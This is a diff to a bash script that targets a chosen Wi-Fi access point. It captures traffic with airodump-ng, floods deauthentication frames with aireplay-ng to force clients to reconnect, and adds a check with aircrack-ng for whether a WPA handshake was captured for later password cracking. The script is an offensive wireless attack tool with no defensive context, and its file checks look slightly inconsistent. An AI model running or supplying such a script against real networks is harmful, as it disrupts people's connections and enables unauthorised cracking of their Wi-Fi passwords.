@@ -9,7 +9,20 @@ sudo rm scan-01.csv
 echo "$BSSID"
 echo "$CHANNEL"
 echo "$ESSID"
-sudo timeout 30 airodump-ng --bssid "$BSSID" -c "$CHANNEL" --write "$BSSID" --output-format cap  wlan0 &
+sudo timeout 10 airodump-ng --bssid "$BSSID" -c "$CHANNEL" --write "$BSSID" --output-format cap  wlan0 &
 sudo aireplay-ng --deauth 10 -a "$BSSID" wlan0 >/dev/null
-wait  
+wait
+if aircrack-ng "$BSSID".cap | grep -q "WPA (0" ; then
+        rm "$BSSID"-01.cap
+	echo "handshake is not captured"
+else
+        if  aircrack-ng "$BSSID"-01.cap | grep -q "WPA (" ; then
+                echo "handshake is captured" 
+        else
+                rm "$BSSID"-01.cap
+		echo "handshake is not captured"	
+        fi
+fi
+
+
 
